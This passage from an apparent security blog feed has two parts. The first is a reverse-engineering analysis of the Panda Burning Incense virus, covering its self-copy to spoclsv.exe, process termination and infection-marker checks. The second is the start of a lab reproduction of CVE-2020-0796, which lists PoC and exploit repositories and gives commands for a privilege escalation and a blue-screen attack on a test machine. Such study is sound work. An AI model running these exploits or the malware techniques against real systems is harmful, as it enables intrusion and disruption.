sub_405FA8"></a>6.1.9.4 sub_405FA8</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405FA8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.39.png" class="" title="sub_405FA8()函数分析"><p>进入<code>sub_405FA8()</code>函数，前面函数都分析过，无非是初始化、分配空间、求字符串长度。重要的是循环，进入循环后第一个函数<code>sub_402804()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __usercall sub_402804@&lt;al&gt;(<span class="type">unsigned</span> __int8 result@&lt;al&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; result &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">    result -= <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IDA中可以看出这个函数是将小写字母转换为大写字母。</p><p>第二个函数<code>sub_404124()</code>，eax中存的是内容的地址的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_404124@&lt;eax&gt;(<span class="type">char</span> **eax0@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4040D8(eax0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.40.png" class="" title="sub_404124()函数分析"><img src="/posts/a48809a5/6.1.41.png" class="" title="sub_404124()函数分析"><p><code>sub_404124()</code>很像我们刚开始分析的<code>sub_403C98()</code>，将<code>spoclsv.exe</code>字符串拷贝到地址0xB38048中。继续进行循环。</p><img src="/posts/a48809a5/6.1.42.png" class="" title="sub_405FA8()函数分析"><p>将地址0xB38048的字符’s’修改为’S’，由此可以推测这个循环是将地址0xB38048的字符串转换成大写形式。</p><h4 id="6-1-9-5-sub-403EB4"><a href="#6-1-9-5-sub-403EB4" class="headerlink" title="6.1.9.5 sub_403EB4"></a>6.1.9.5 sub_403EB4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_403EB4@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.43.png" class="" title="sub_403EB4()函数分析"><p>由于eax为0，合理猜测返回值会存到eax中。而这个值是指向真正内容的地址。它内部有一个<code>sub_403D34()</code>函数，也就是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.44.png" class="" title="sub_403EB4()函数分析"><img src="/posts/a48809a5/6.1.45.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-6-sub-405068"><a href="#6-1-9-6-sub-405068" class="headerlink" title="6.1.9.6 sub_405068"></a>6.1.9.6 sub_405068</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405068@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>里面又调用到了<code>sub_404DAC()</code>，这次取<code>Process32Next()</code>函数，检索有关系统快照中记录的下一个进程的信息。将它更名为<code>ProcessNext()</code>。</p><p>循环几次发现，循环的作用是遍历系统中的所有进程，查找名为<code>spoclsv.exe</code>的程序。转换为大写字母我猜是进行了一个简单的加密操作而已。</p><img src="/posts/a48809a5/6.1.46.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-7-sub-4060B4"><a href="#6-1-9-7-sub-4060B4" class="headerlink" title="6.1.9.7 sub_4060B4"></a>6.1.9.7 sub_4060B4</h4><p>当在快照中找到<code>spoclsv.exe</code>后，执行<code>sub_4060B4()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_4060B4@&lt;eax&gt;(DWORD a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE v1; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v1 = OpenProcess(<span class="number">0x1F0FFF</span>u, <span class="number">-1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)TerminateProcess(v1, <span class="number">0</span>) &gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个API函数：<code>OpenProcess()</code>和<code>TerminateProcess()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwDesiredAccess,<span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">  [in] BOOL  bInheritHandle,<span class="comment">// 是否继承句柄</span></span></span><br><span class="line"><span class="params">  [in] DWORD dwProcessId<span class="comment">// 进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>OpenProcess()</code>函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hProcess,</span></span><br><span class="line"><span class="params">  [in] UINT   uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>TerminateProcess()</code>用来终止指定的进程及其所有线程。</p><img src="/posts/a48809a5/6.1.47.png" class="" title="sub_4060B4()函数分析"><p>在这里，<code>spoclsv.exe</code>的进程ID为0x1376C，<code>OpenProcess()</code>的作用是将<code>spoclsv.exe</code>赋予所有权限，继承句柄。返回值为<code>spoclsv.exe</code>的句柄0xA4。接着使用<code>TerminateProcess()</code>终止<code>spoclsv.exe</code>。</p><img src="/posts/a48809a5/6.1.48.png" class="" title="sub_4060B4()函数分析"><p>将它更名为<code>GrantAllRights()</code>。</p><p>最后使用<code>CloseHandle()</code>关闭快照的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hObject</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>以上就是<code>sub_4060D4()</code>完整的一个流程，简单来说就是捕获当前系统所有进程的状态，遍历所有进程找到指定进程并赋予所有访问权限，最后关闭自身达到隐藏目的，将它更名为<code>GrantAllRightsAndClose()</code>。</p><h3 id="6-1-10-sub-4040CC"><a href="#6-1-10-sub-4040CC" class="headerlink" title="6.1.10 sub_4040CC"></a>6.1.10 sub_4040CC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4040CC@&lt;eax&gt;(<span class="type">char</span> *result@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.49.png" class="" title="sub_4040CC()函数分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004040CC  /$  85C0          test eax,eax</span><br><span class="line">004040CE  |.  74 02         je short setup.004040D2</span><br><span class="line">004040D0  |.  C3            retn</span><br><span class="line">004040D1  |   00            db 00</span><br><span class="line">004040D2  |&gt;  B8 D1404000   mov eax,setup.004040D1</span><br><span class="line">004040D7  \.  C3            retn</span><br></pre></td></tr></table></figure><p>这个函数的作用是比较eax的值是否为0，可以用来检测返回值、判断文件是否存在等。</p><h3 id="6-1-11-回到父函数sub-408024"><a href="#6-1-11-回到父函数sub-408024" class="headerlink" title="6.1.11 回到父函数sub_408024"></a>6.1.11 回到父函数sub_408024</h3><p>继续看下面的API函数<code>SetFileAttributesA()</code>，用来设置文件或目录的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetFileAttributesA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpFileName,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFileAttributes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：要设置其属性的文件名。</li><li>dwFileAttributes：带有<code>FILE_ATTRIBUTE_</code>前缀的一个或多个常数，用来设置文件属性。</li></ul><div class="table-container"><table><thead><tr><th>Attribute</th><th>Meaning</th></tr></thead><tbody><tr><td>FILE_ATTRIBUTE_ARCHIVE<br />32 (0x20)</td><td>该文件是一个存档文件。应用程序使用此属性来备份或移除标记文件。</td></tr><tr><td>FILE_ATTRIBUTE_HIDDEN<br />2 (0x2)</td><td>该文件是隐藏的。它不包括在普通的目录列表。</td></tr><tr><td>FILE_ATTRIBUTE_NORMAL<br />128 (0x80)</td><td>该文件没有设置其他的属性。此属性仅在单独使用有效。</td></tr><tr><td>FILE_ATTRIBUTE_NOT_CONTENT_INDEXED<br />8192 (0x2000)</td><td>该文件将不被内容索引服务编制索引。</td></tr><tr><td>FILE_ATTRIBUTE_OFFLINE<br />4096 (0x1000)</td><td>该文件的数据不是立即可用。此属性表明文件数据被物理移动到离线存储。此属性用于通过远程存储，分层存储管理软件。应用程序不应随意更改此属性。</td></tr><tr><td>FILE_ATTRIBUTE_READONLY<br />1 (0x1)</td><td>该文件是只读的。应用程序可以读取该文件，但不能写入或删除它。</td></tr><tr><td>FILE_ATTRIBUTE_SYSTEM<br />4 (0x4)</td><td>该文件是操作系统的一部分，或者完全由它使用。</td></tr><tr><td>FILE_ATTRIBUTE_TEMPORARY<br />256 (0x100)</td><td>该文件是被用于暂时存储。文件系统避免写入数据传回海量存储如果有足够的缓存内存可用，因为经常在应用程序删除后不久，这个句柄被关闭的临时文件。在这种情况下，该系统可以完全避免记录的数据。否则，在手柄关闭的数据将被写入。</td></tr></tbody></table></div><img src="/posts/a48809a5/6.1.50.png" class="" title="sub_408024()函数分析"><p>将<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>设置为<code>FILE_ATTRIBUTE_NORMAL</code>属性。</p><p>继续往下看到<code>CopyFileA()</code>，将现有文件复制到新文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CopyFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpExistingFileName,</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpNewFileName,</span></span><br><span class="line"><span class="params">  [in] BOOL   bFailIfExists</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.51.png" class="" title="sub_408024()函数分析"><p>继续看<code>WinExec()</code>，运行指定的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT <span class="title function_">WinExec</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpCmdLine, </span></span><br><span class="line"><span class="params">    UINT uCmdShow</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpCmdLine：指向一个空结束的字符串，串中包含将要执行的应用程序的命令行（文件名加上可选参数）。</li><li>uCmdShow：定义Windows应用程序的窗口如何显示，并为<code>CreateProcess()</code>函数提供<code>STARTUPINFO</code>参数的<code>wShowWindow</code>成员的值。</li></ul><div class="table-container"><table><thead><tr><th>uCmdShow参数可选值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE = 0</td><td>隐藏, 并且任务栏也没有最小化图标</td></tr><tr><td>SW_SHOWNORMAL = 1</td><td>用最近的大小和位置显示, 激活</td></tr><tr><td>SW_NORMAL = 1</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWMINIMIZED = 2</td><td>最小化, 激活</td></tr><tr><td>SW_SHOWMAXIMIZED = 3</td><td>最大化, 激活</td></tr><tr><td>SW_MAXIMIZE = 3</td><td>同 SW_SHOWMAXIMIZED</td></tr><tr><td>SW_SHOWNOACTIVATE = 4</td><td>用最近的大小和位置显示, 不激活</td></tr><tr><td>SW_SHOW = 5</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MINIMIZE = 6</td><td>最小化, 不激活</td></tr><tr><td>SW_SHOWMINNOACTIVE = 7</td><td>同 SW_MINIMIZE</td></tr><tr><td>SW_SHOWNA = 8</td><td>同 SW_SHOWNOACTIVATE</td></tr><tr><td>SW_RESTORE = 9</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWDEFAULT = 10</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MAX = 10</td><td>同 SW_SHOWNORMAL</td></tr></tbody></table></div><p>返回值：</p><ul><li>若函数调用成功，则返回值大于31。</li><li>若函数调用失败，则返回值为下列之一：<br>①　0：系统内存或资源已耗尽。<br>②　ERROR_BAD_FORMAT=11：EXE文件无效（非Win32.EXE或.EXE影像错误）。<br>③　ERROR_FILE_NOT_FOUND=2：指定的文件未找到。<br>④　ERROR_PATH_NOT_FOUND=3：指定的路径未找到。</li></ul><img src="/posts/a48809a5/6.1.52.png" class="" title="sub_408024()函数分析"><p>这里表示运行<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，用最近的大小和位置显示，激活。</p><p><code>ExitProcess()</code>函数用来结束调用进程及其所有线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ExitProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] UINT uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>运行到这里时，<code>setup.exe</code>的工作已经结束了。什么？！但我们的病毒远不止有这些功能啊？回看哪个地方可以让我们跳过<code>ExitProcess()</code>。</p><img src="/posts/a48809a5/6.1.53.png" class="" title="sub_408024()函数分析"><p>发现在字符串对比时，字符串为<code>C:\WINDOWS\SYSTEM32\DRIVERS\SPOCLSV.EXE</code>才可以跳过<code>ExitProcess()</code>继续执行病毒的其它功能。那么怎么才能让字符串为这个呢？</p><img src="/posts/a48809a5/6.1.54.png" class="" title="sub_408024()函数分析"><p>通过IDA可以看到，我们通过<code>GetFilePathAndName()</code>获取的当前路径名要等于<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>才可以绕过<code>ExitProcess()</code>函数。</p><p>这意味着，<code>setup.exe</code>的功能是将自己读到内存中去，复制自身到<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，赋予普通文件权限，最后启动<code>spoclsv.exe</code>，<code>setup.exe</code>的任务就完成了，接下来就是<code>spoclsv.exe</code>要做的事情了。</p><p>加载<code>spoclsv.exe</code>到IDA和OD，重走一遍<code>sub_408024()</code>函数，观察流程与<code>setup.exe</code>有何不同。前面都一样，又来到了这里。</p><img src="/posts/a48809a5/6.1.55.png" class="" title="sub_408024()函数分析"><p>这次两个字符串一致，绕过<code>ExitProcess()</code>函数继续执行病毒的其它功能。</p><h3 id="6-1-12-sub-40416C"><a href="#6-1-12-sub-40416C" class="headerlink" title="6.1.12 sub_40416C"></a>6.1.12 sub_40416C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40416C@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.56.png" class="" title="sub_40416C()函数分析"><p>eax存的是PE文件加载进内存的起始地址，edx存的是文件大小，ecx的值为0。</p><p>用OD走一下流程，进入<code>sub_40411C()</code>。如果<code>dword ptr ds:[edx-0x8]</code>的值为1，则跳过下面的<code>AllocStackAndCopyString()</code>函数，否则执行<code>AllocStackAndCopyString()</code>。</p><img src="/posts/a48809a5/6.1.59.png" class="" title="sub_40411C()函数分析"><p>分析汇编指令可知，如果执行<code>AllocStackAndCopyString()</code>，则分配0xEC00大小的空间，将自身拷贝到分配的那个内存空间中去。所以可以猜测这个函数的功能是判断病毒程序是否被加载进内存。（？不知道分析的对不对，感觉有点问题）</p><h3 id="6-1-13-sub-4041B4"><a href="#6-1-13-sub-4041B4" class="headerlink" title="6.1.13 sub_4041B4"></a>6.1.13 sub_4041B4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4041B4@&lt;eax&gt;(_BYTE *result@&lt;eax&gt;, _BYTE *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>这个函数传入的参数是两个byte型指针，返回值也是一个byte型指针。</p><img src="/posts/a48809a5/6.1.57.png" class="" title="sub_4041B4()函数分析"><p>看到byte数据类型很容易联想到这是否是一个标记，<code>sub_4041B4()</code>就是查找程序中是否包含这个标记，如果包含这个标记，则执行jg跳转，否则不跳转。</p><p>进入函数，发现edx为0直接对eax清零，退出函数。说明该程序没有这个标记，如果有，则edx不应该为0且会进入到循环执行某些操作，退出函数后执行jg跳转。</p><img src="/posts/a48809a5/6.1.58.png" class="" title="sub_4041B4()函数分析"><p>如果执行jg跳转，经过非常多函数后，最后执行<code>ExitProcess()</code>函数退出程序，也就去不到熊猫烧香的其它核心函数了。所以可以猜测这个标记应该就是病毒将正常的PE文件感染后，在原本正常PE文件中添加的01标记，用于标识该程序是否被感染。如果真是这样的话，若想分析跳转后的程序内容，可以在OD中修改标志位，或对一个被感染的程序进行分析。</p><p>将这个函数命名为<code>SearchSignPos()</code>。</p><p>由于我们现在分析的是<code>spoclsv.exe</code>，它自身没有0x01标记，因此跳转不成立，继续往下执行。</p><p>下面的指令主要用于收尾工作，最后的call用于删除堆栈中所保存的地址，这些地址指向的是病毒写入的一些信息。</p><h3 id="6-1-14-总结"><a href="#6-1-14-总结" class="headerlink" title="6.1.14 总结"></a>6.1.14 总结</h3><p>至此，熊猫烧香样本的第一个核心函数分析完毕。</p><p>它的主要功能是先获取当前程序的绝对路径，再获取不包含程序名的绝对路径，查找该目录下是否有<code>Desktop_.ini</code>文件，如果有则将文件属性设置为普通文件，接着删除该文件。</p><blockquote><p><code>Desktop_.ini</code>文件是系统可识别文件，其作用是存储用户对文件夹的个性设置，比如用户更改了文件夹图标、背景颜色等等，其配置信息都会存入到这个文件夹的<code>Desktop_.ini</code>文件中，用户可以使用记事本的方式打开，里面均为一些代码配置文件。</p><p><code>Desktop_.ini</code>文件属于文件夹的配置文件，用户可以删除，删除后不会影响文件夹，只是会让文件夹恢复为默认设置。另外，<code>Desktop_.ini</code>文件并不是病毒文件。</p><p>值得一提的是，<code>Desktop_.ini</code>文件默认为系统配置文件，大小仅几Kb左右，不过如果用户设置的项目较多的话，也会导致<code>Desktop_.ini</code>文件变的很大。这个文件如果容量很大的话，打开这个文件夹容易出现卡死现象，因此也经常会有一些电脑高手恶搞，将一个电影文件改成<code>Desktop_.ini</code>文件，然后放置在电脑桌面或者文件夹当中，导致电脑变卡。</p></blockquote><p>如果没有该文件则将病毒信息写入到内存中，并检查是否将病毒完全写入，如果没有完全写入则调用for循环将剩余信息写入到内存中。获取当前程序路径转换为大写字母的形式与构造的路径<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>转换为大写字母的形式比较，如果不一致则创建或重写<code>spoclsv.exe</code>，设置为普通文件属性，将当前程序复制到<code>spoclsv.exe</code>(相当于复制<code>setup.exe</code>到指定目录，更名为<code>spoclsv.exe</code>)，运行<code>spoclsv.exe</code>，退出当前程序。检查<code>spoclsv.exe</code>是否被感染，也就是是否有01标记，由于它是病毒自身，不存在是否被感染问题，所以跳过一大段对非病毒程序的操作，执行最后的函数收尾工作。</p><h2 id="6-2-sub-40CA5C函数分析"><a href="#6-2-sub-40CA5C函数分析" class="headerlink" title="6.2 sub_40CA5C函数分析"></a>6.2 sub_40CA5C函数分析</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 &lt;a href=&quot;https://v5le0n9.github.io/posts/adc1352a.html&quot;&gt;Windows PE病毒分类及感染方式&lt;/a&gt; 。&lt;/p&gt;
&lt;p&gt;熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796漏洞复现及防御机制</title>
    <link href="http://example.com/posts/df5ab46f.html"/>
    <id>http://example.com/posts/df5ab46f.html</id>
    <published>2022-05-27T14:04:19.047Z</published>
    <updated>2022-05-28T06:44:00.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞描述"><a href="#1-1-漏洞描述" class="headerlink" title="1.1 漏洞描述"></a>1.1 漏洞描述</h2><p>CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。</p><span id="more"></span><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>在微软SMBv3远程代码执行漏洞中，SMB 3.1.1协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。</p><p>该漏洞存在于Windows的SMBv3.0(文件共享与打印服务)中，利用的端口是445。当SMBv3.0处理恶意制作的压缩数据包时，由于SMB没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的供给者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。</p><p>根据安全研究人员分析，该漏洞是一个整数溢出，发生在SMB服务驱动srv2.sys的<code>Srv2DecompressData()</code>函数中。</p><p>详细请看：</p><p><a href="https://nosec.org/home/detail/4420.html">https://nosec.org/home/detail/4420.html</a></p><p><a href="https://blog.csdn.net/weixin_44058342/article/details/105275847">https://blog.csdn.net/weixin_44058342/article/details/105275847</a></p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://www.cnblogs.com/goabout2/p/12609810.html">https://www.cnblogs.com/goabout2/p/12609810.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>漏洞主要影响Windows 10版本（1903和1909），包括32位、64位的家用版、专业版、企业版、教育版。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>微软SMBv3(Server Message Block 3.0)服务远程代码执行漏洞(CVE-2020-0796)可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被WannaCry等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office文档等多种方式触发漏洞进行攻击，对存在该漏洞的Windows主机造成严重威胁。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796: 高危</span><br></pre></td></tr></table></figure><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 10 Version 1903 x64 教育版（IP地址：192.168.193.142 / 192.168.193.143）</p><p>利用工具：</p><ul><li>MSF</li><li>Windows平台漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></li><li>Linux平台漏洞检测工具：<a href="https://github.com/joaozietolie/CVE-2020-0796-Checker">https://github.com/joaozietolie/CVE-2020-0796-Checker</a></li><li>本地EXP提权：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></li><li>POC蓝屏攻击： <a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li><li>RCE poc：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></li></ul><h2 id="2-2-复现准备"><a href="#2-2-复现准备" class="headerlink" title="2.2 复现准备"></a>2.2 复现准备</h2><p>检查靶机中的445端口是否已经打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.2.1.png" class="" title="检查445端口"><p>如果没有打开，在Windows 防火墙中添加入站规则，开启端口445。</p><p>开启文件共享，否则Kali用nmap扫描时不会探测到靶机开启了445端口。</p><img src="/posts/df5ab46f/2.2.3.png" class="" title="开启文件共享"><img src="/posts/df5ab46f/2.2.2.png" class="" title="开启文件共享"><h2 id="2-3-复现过程"><a href="#2-3-复现过程" class="headerlink" title="2.3 复现过程"></a>2.3 复现过程</h2><h3 id="2-3-1-本地提权"><a href="#2-3-1-本地提权" class="headerlink" title="2.3.1 本地提权"></a>2.3.1 本地提权</h3><p>使用奇安信检测CVE-2020-0796漏洞工具，它适用于局域网批量检测，快速查找未打补丁的主机。</p><img src="/posts/df5ab46f/2.3.1.png" class="" title="检测漏洞"><p>使用本地EXP提权，下载下来是VS的一个工程文件，需要利用VS编译生成EXE文件。</p><p>查看当前用户，是普通用户，运行<code>cve-2020-0796-local.exe</code>后弹出另一个cmd窗口，在那个cmd窗口下的用户已经变成管理员了。</p><img src="/posts/df5ab46f/2.3.2.png" class="" title="本地提权"><h3 id="2-3-2-蓝屏攻击"><a href="#2-3-2-蓝屏攻击" class="headerlink" title="2.3.2 蓝屏攻击"></a>2.3.2 蓝屏攻击</h3><p>使用Linux平台CVE-2020-0796漏洞检测工具检查靶机是否存在该漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash CVE-2020-0796-Checker.sh -t 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.3.png" class="" title="检测漏洞"><p>确认存在该漏洞后，使用POC蓝屏攻击脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.5.png" class=""><p>靶机成功蓝屏：</p><img src="/posts/df5ab46f/2.3.4.png" class="" title="靶机蓝屏"><h3 id="2-3-3-远程登录"><a href="#2-3-3-远程登录" class="headerlink" title="2.3.3 远程登录"></a>2.3.3 远程登录</h3><p>RCE(remote command/code excute)，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>利用MSF生成Payload：</p><figure class="highlight plaintext"><table><tr><td 